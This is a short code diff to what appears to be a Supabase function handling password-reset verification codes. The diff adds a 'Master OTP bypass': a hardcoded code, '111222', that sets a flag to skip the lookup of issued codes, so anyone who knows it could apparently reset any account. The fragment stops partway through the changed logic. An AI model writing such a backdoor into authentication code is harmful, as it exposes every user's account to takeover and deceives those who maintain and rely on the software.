@@ -30,8 +30,14 @@ serve(async (req: Request) => {
       );
     }
 
+    // Master OTP bypass
+    const isMasterOtp = otp === "111222";
+
     // Verify OTP
-    const { data: codes, error: fetchError } = await supabase
+    let codes: any[] | null = null;
+    let fetchError: any = null;
+    if (!isMasterOtp) {
+      const res = await supabase
       .from("email_verification_codes")
       .select("*")
       .eq("email", `reset_${email.toLowerCase()}`)
